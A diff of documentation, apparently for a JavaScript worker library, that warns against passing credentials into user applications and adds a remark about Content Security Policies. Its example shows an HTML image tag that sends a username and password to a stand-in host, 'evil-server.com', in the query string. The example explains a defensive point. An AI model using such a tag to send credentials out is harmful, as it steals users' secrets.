@@ -60,7 +60,7 @@ if (origin instanceof WorkerServer) {
 
 You never want to let credentials leak back into user applications, as they may be able to pass that data out to a remote host.
 
- > Even a totally isolated worker can reach a remote server! For instance, what happens when they put `<img src="http://evil-server.com/picture.png?user=pfraze&password=foobar" />` in their HTML?
+ > Even a totally isolated worker can reach a remote server! For instance, what happens when they put `<img src="http://evil-server.com/picture.png?user=pfraze&password=foobar" />` in their HTML? Unless you have highly-restrictive [Content Security Policies](https://developer.mozilla.org/en-US/docs/Security/CSP), the data in the query parameters will escape.
 
 For this reason, it is best to add Auth headers to requests in the environment. For instance:
 
